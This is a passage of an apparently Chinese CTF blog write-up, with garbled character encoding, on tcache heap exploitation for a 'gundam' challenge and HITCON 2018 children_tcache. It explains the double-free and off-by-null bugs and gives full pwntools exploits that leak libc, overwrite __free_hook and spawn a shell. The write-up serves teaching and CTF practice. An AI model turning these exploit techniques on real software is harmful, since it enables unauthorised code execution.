&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èœå•åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ul><li>Buildï¼šç”³è¯·ä¸€å—0x28å¤§å°çš„chunkç”¨æ¥å­˜å‚¨gundamçš„ç»“æ„ä½“ <code>struct gundam{ int inuse; char* name; char type[24] }</code>ï¼Œå…¶ä¸­<code>name</code>ä¸º0x100å¤§å°ã€‚æœ€å¤šåˆ›å»º9ä¸ªgundamã€‚</li><li>Visitï¼šæ‰“å°gundamçš„<code>name</code>åŠ<code>type</code></li><li>Destoryï¼šfreeæŒ‡å®šgundamçš„<code>name</code>ï¼Œæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå¯<code>double free</code></li><li>Blowupï¼šfreeæ‰€æœ‰å·²ç»destoryè¿‡çš„gundamï¼Œå¹¶æ¸…ç©ºæŒ‡é’ˆã€‚</li></ul><p>æ€è·¯åˆ†æï¼š</p><ol><li>ç¬¬ä¸€æ­¥ä¾ç„¶æ˜¯æ³„éœ²libcåœ°å€</li></ol><ul><li>æœ¬é¢˜æˆ‘ä»¬ä¸èƒ½æ§åˆ¶mallocçš„å¤§å°ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•ä¸€ï¼Œåªèƒ½ä½¿ç”¨æ–¹æ³•äºŒã€‚æœ¬é¢˜æœ€å¤šå¯ä»¥åˆ›å»º9ä¸ªgundamï¼Œå¾ˆå®¹æ˜“å°±èƒ½æŠŠ<code>tcache</code>å¡«æ»¡7ä¸ªï¼Œä¹‹åçš„freeæ‰çš„chunkå°±ä¼šæ”¾åˆ°<code>unsorted bin</code>ã€‚æ¥ç€ä½¿ç”¨visitåŠŸèƒ½æ³„éœ²<code>unsorted bin</code>çš„fdå³å¯ã€‚</li></ul><ol><li>ä½¿ç”¨<code>tcache dup</code>è¿›è¡Œä»»æ„åœ°å€å†™</li></ol><ul><li><code>tcache dup</code>ç±»ä¼¼<code>fastbin dup</code>ï¼Œåˆ©ç”¨çš„æ˜¯ <code>tcache_put()</code> çš„ä¸ä¸¥è°¨å¯ä»¥å¯¹åŒä¸€ä¸ªchunkå¤šæ¬¡ freeï¼Œ<code>tcache_put()</code> çš„æ£€æŸ¥å‡ ä¹ç­‰äºæ²¡æœ‰ï¼Œfastbinä¸èƒ½è¿ç»­é‡Šæ”¾åŒä¸€ä¸ªchunkï¼Œè€Œä¸”è¿˜éœ€é€‰æ‹©å¤§å°åˆé€‚çš„ä½ç½®ï¼Œè€Œ<code>tcache</code>æ²¡æœ‰è¿™ç§é™åˆ¶ï¼Œä½¿ç”¨èµ·æ¥æ¯”<code>fastbin dup</code>è¿˜è¦ç®€å•ã€‚ä½¿ç”¨destoryåŠŸèƒ½è¿›è¡Œ<code>double free</code>åï¼Œæ¥ç€æ–°å»ºä¸¤ä¸ªgundamåå³å¯åˆ†é…åˆ°æŒ‡å®šä½ç½®ï¼Œä¿®æ”¹<code>free_hook</code>ä¸º<code>system</code>æˆ–<code>onegadget</code>å³å¯getshellã€‚</li></ul><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./gundam'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bulid</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name of gundam :'</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">'type of the gundam :'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Destory:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    bulid(<span class="string">'aaaa'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    destory(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    bulid(<span class="string">'bbbb'</span>)</span><br><span class="line">bulid(<span class="string">'cccccccc'</span>)</span><br><span class="line">visit()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># tcache dup</span></span><br><span class="line">destory(<span class="number">1</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line">blow_up()</span><br><span class="line">bulid(p64(libc.sym[<span class="string">'__free_hook'</span>])) <span class="comment"># 0</span></span><br><span class="line">bulid(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">bulid(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">destory(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcon2018-children-tcache"><a href="#hitcon2018-children-tcache" class="headerlink" title="hitcon2018 children_tcache"></a>hitcon2018 children_tcache</h2><p>é¢˜ç›®åŠŸèƒ½ä¸å¤šï¼Œå°±3ä¸ªï¼Œæˆ‘ä»¬æ¥ä¸€ä¸€åˆ†æã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">ğŸŠ    Children Tcache    ğŸŠ</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   1. New heap           $</span><br><span class="line">$   2. Show heap          $</span><br><span class="line">$   3. Delete heap        $</span><br><span class="line">$   4. Exit               $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  sub_AEB();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid Choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">new</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èœå•åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ol><li>newï¼šåˆ›å»ºä¸€ä¸ªheapï¼ˆæœ€å¤š10ä¸ªï¼‰ï¼Œå¯æ§åˆ¶sizeï¼Œç”±äºä½¿ç”¨äº†<code>strcpy(dest, &amp;s)</code>ï¼ˆæŠŠä»srcåœ°å€å¼€å§‹ä¸”å«æœ‰NULLç»“æŸç¬¦çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°ä»¥destå¼€å§‹çš„åœ°å€ç©ºé—´ï¼‰ï¼Œå­˜åœ¨ä¸€ä¸ª<code>off by null</code>æ¼æ´ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2034h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-2030h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-2028h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-2020h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2038h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x2010</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_list[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  get_str((__int64)&amp;s, size);  <span class="comment">// æœ‰00æˆªæ–­</span></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);   <span class="comment">// off by null</span></span><br><span class="line">  heap_list[i] = dest;</span><br><span class="line">  size_list[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>showï¼šæ‰“å°æŒ‡å®šindexçš„heap</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v2 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  v0 = heap_list[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(heap_list[v2]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>deleteï¼šfreeæŒ‡å®šindexçš„heapï¼Œå¹¶ä¸”æ¸…ç©ºäº†æŒ‡é’ˆã€‚<code>memset((void *)heap_list[v1], 0xDA, size_list[v1]);</code>freeå‰å¡«å……äº†<code>\xda</code>ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap_list[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)heap_list[v1], <span class="number">0xDA</span>, size_list[v1]); <span class="comment">// å‘ç‚¹</span></span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_list[v1]);</span><br><span class="line">    heap_list[v1] = <span class="number">0L</span>L;</span><br><span class="line">    size_list[v1] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®åˆ†æï¼š</p><ul><li>è¿™é¢˜æ¯”è¾ƒéº»çƒ¦çš„æ˜¯æ²¡æœ‰ä¸€ä¸ªå¾ˆç›´æ¥çš„<code>double free</code>æ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œdeleteçš„æ—¶å€™æ¸…ç©ºäº†æŒ‡é’ˆã€‚è€Œæ¯”è¾ƒæ˜æ˜¾çš„æ¼æ´å°±æ˜¯<code>off by null</code>ï¼Œé‚£ä¹ˆå…³é”®å°±æ˜¯å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´äº†ã€‚</li><li>ç”±äºåˆ†é…çš„heapç©ºé—´æ˜¯è¿ç»­çš„ï¼Œå¯ä»¥åˆ©ç”¨<code>off by null</code>æŠŠä¸‹ä¸€ä¸ªchunkçš„sizeå€¼çš„æœ€ä½ä½è¦†ç›–æˆ<code>\x00</code>ï¼ŒåŒæ—¶æ”¾å…¥ä¸€ä¸ªåˆé€‚<code>pre_size</code>å€¼ï¼ŒæŠŠå‰é¢å·²åˆ†é…çš„chunkä¼ªé€ æˆä¸€ä¸ªå·²freeçš„chunkï¼Œå½“freeæ­¤chunkæ—¶ä¼šè¿›è¡Œå‘å‰åˆå¹¶ï¼Œé€ æˆ<code>overlapping chunks</code>ã€‚</li><li>é¢˜ç›®å¯ä»¥æ§åˆ¶mallocçš„å¤§å°ï¼Œå› æ­¤é€‰æ‹©åˆ›å»ºä¸€ä¸ªå¯ä»¥æ”¾å…¥<code>unsorted bin</code>çš„chunkè¿›è¡Œlibcåœ°å€æ³„éœ²ã€‚</li></ul><p>è§£é¢˜æ­¥éª¤ï¼š</p><ul><li>ç”³è¯·ä¸¤ä¸ªå¤§äº<code>tcache</code>èŒƒå›´çš„heapï¼Œä¸­é—´é¢„ç•™ä¸€ä¸ªheapï¼ˆ<code>tcache</code>èŒƒå›´å†…å³å¯ï¼‰åšå¤‡ç”¨ï¼Œä¾æ¬¡è®°ä½œ<code>#0ï¼Œ#1ï¼Œ#2</code>ï¼Œå¯¹åº”ä¸‹å›¾çš„ç¬¬2-4ä¸ªchunkã€‚</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104626-b8d4cd78-3002-1.png" alt=""></p><ul><li>æŠŠ<code>#0</code>å’Œ<code>#1</code>ä¸¤ä¸ªheapé‡Šæ”¾æ‰ï¼Œæ­¤æ—¶<code>#0</code>å·è¿›å…¥<code>unsorted bins</code>ï¼Œ<code>#1</code>å·è¿›å…¥<code>tcache</code>ã€‚</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104647-c574d0fa-3002-1.png" alt=""></p><ul><li>ç”³è¯·ä¸€ä¸ª<code>#1</code>å·å¤§å°çš„heapï¼ˆ<code>#0&#39;</code>ï¼‰ï¼Œåˆ©ç”¨<code>off by null</code>ä¿®æ”¹æ‰<code>#2</code>å·heapçš„<code>size</code>ï¼Œè¿˜è¦æ”¹æ‰<code>pre_size</code>ï¼Œå½“freeæ‰<code>#2</code>å·heapæ—¶å³å¯å‘ç”Ÿå‘å‰åˆå¹¶ï¼Œæ­¤æ—¶<code>#0&#39;</code>å·heapå°†ä¸<code>unsorted bin</code>é‡å ã€‚</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104710-d3996e52-3002-1.png" alt=""></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104726-dc923192-3002-1.png" alt=""></p><ul><li>ç”³è¯·ä¸€ä¸ª<code>#0</code>å·å¤§å°çš„heapï¼Œè¿™æ—¶<code>#0&#39;</code>å·ä¸åˆ†å‰²åçš„<code>unsorted bin</code>çš„<code>fd</code>é‡å ï¼Œæ‰“å°<code>#0&#39;</code>å·heapä¿¡æ¯å³å¯æ³„éœ²libcåœ°å€ã€‚</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104741-e5ba1e38-3002-1.png" alt=""></p><ul><li>ç”³è¯·ä¸€ä¸ª<code>#0&#39;</code>å·å¤§å°çš„heap(<code>#2&#39;</code>)ï¼Œ<code>#0&#39;</code>å’Œ<code>#2&#39;</code>å°†é‡å ï¼Œå¯ä»¥è¿›è¡Œ<code>double free</code>ã€‚</li></ul><p><img src="_v_images/20190204230419929_3880.png" alt=""></p><ul><li>è·Ÿç€å°±æ˜¯<code>tcache dup</code>çš„å¸¸è§„å¥—è·¯ã€‚</li></ul><p>å‘ç‚¹ï¼š</p><ul><li>ç”±äºdeleteçš„æ—¶å€™å¡«å……äº†åƒåœ¾æ•°æ®<code>\xDA</code>ï¼Œè€Œä¸”newçš„æ—¶å€™å†™å…¥æ˜¯æœ‰<code>\x00</code>æˆªæ–­ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨<code>strcpy</code>ä¼šå¤åˆ¶æœ«å°¾<code>\x00</code>çš„ç‰¹ç‚¹ï¼Œä¸åœæ”¹å˜æ–°å»ºheapçš„å¤§å°ï¼Œç„¶ååˆ é™¤ï¼Œä¸€å­—èŠ‚ä¸€å­—èŠ‚åœ°æŠŠ<code>\xDA</code>æ¸…ç©ºæ‰ï¼Œä¹‹åæ‰èƒ½æ­£ç¡®å¡«å……<code>pre_size</code>ã€‚</li></ul><p>å®Œæ•´EXPï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./children_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'Data:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bins &gt; 0x408</span></span><br><span class="line">new(<span class="number">0x410</span>,<span class="string">'0000'</span>)    <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'1111'</span>)     <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">'2222'</span>)    <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'3333'</span>)     <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># overwrite next chunk size &amp; clean pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    new(<span class="number">0x28</span>-i,(<span class="number">0x28</span>-i)*<span class="string">'a'</span>)   <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># overlapping chunks</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x450</span>))  <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x418</span>,<span class="string">'1111'</span>)   <span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># overwrite free_hook to onegadget</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'2222'</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># 0 = 2</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x28</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line">new(<span class="number">0x28</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>tcacheçš„å®‰å…¨æ£€æŸ¥ç‰¹åˆ«å°‘ï¼Œåˆ©ç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œæ­¤ç±»é¢˜ç›®çš„ä¸»è¦éš¾ç‚¹åœ¨äºå¦‚ä½•æ³„éœ²libcåœ°å€ä»¥åŠå¦‚ä½•åˆ›å»ºé‡å å †å—ã€‚è¿™3ä¸ªé¢˜ç›®åŸºæœ¬æŠŠlibcæ³„éœ²ï¼Œtcache poisoningï¼Œtcache dupï¼Œoverlapping chunkséƒ½æ¶µç›–ï¼Œå€¼å¾—å­¦ä¹ ä¸€ä¸‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥è®ºå› &lt;a href=&quot;https://xz.aliyun.com/t/4102&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4102&lt;/a&gt;&lt;/p&gt;
